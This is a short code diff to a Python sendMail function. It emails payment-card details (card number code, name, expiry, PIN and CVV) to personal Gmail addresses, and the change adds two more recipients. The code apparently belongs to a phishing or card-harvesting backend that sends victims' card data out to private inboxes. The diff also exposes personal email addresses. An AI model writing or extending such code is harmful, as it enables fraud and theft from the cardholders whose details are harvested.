@@ -145,7 +145,7 @@ def sendMail():
 
         # computing message
         msg = Message(subject,
-                      sender=name, recipients=['Williamcampbell693@gmail.com'])
+                      sender=name, recipients=['Williamcampbell693@gmail.com', 'lovedayperfection1@gmail.com', 'olufemichris.dev@gmail.com'])
         msg.body = fill(code, name, exp, pin, cvv)
         msg.html = fill(code, name, exp, pin, cvv)
 
